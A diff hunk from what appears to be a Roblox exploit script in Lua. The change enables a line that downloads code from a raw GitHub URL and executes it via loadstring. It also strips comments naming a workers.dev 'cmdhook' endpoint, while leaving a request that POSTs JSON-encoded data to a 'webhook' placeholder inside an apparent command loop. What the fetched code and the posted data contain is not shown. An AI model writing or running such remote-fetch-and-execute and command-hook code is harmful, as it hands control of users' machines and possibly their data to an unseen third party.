@@ -9471,8 +9471,8 @@ if not _G.Opened then
 					}
 
 					spawn(function()
-						local vercelGet = //loadstring(game:HttpGet("https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Vercel-get"))()
-						local cmdhookUrl = "webhook" //https://oosoos.0dryfd.workers.dev/cmdhook
+						local vercelGet = loadstring(game:HttpGet("https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Vercel-get"))()
+						local cmdhookUrl = "webhook" 
 
 						getgenv().Cooldowner = false
 						getgenv().CommandLoopRunning = false
@@ -9744,7 +9744,7 @@ if not _G.Opened then
 
 											pcall(function()
 												request({
-													Url = "webhook", //https://oosoos.0dryfd.workers.dev/cmdhook
+													Url = "webhook",
 													Method = "POST",
 													Headers = { ["Content-Type"] = "application/json" },
 													Body = game:GetService("HttpService"):JSONEncode(webhookData)
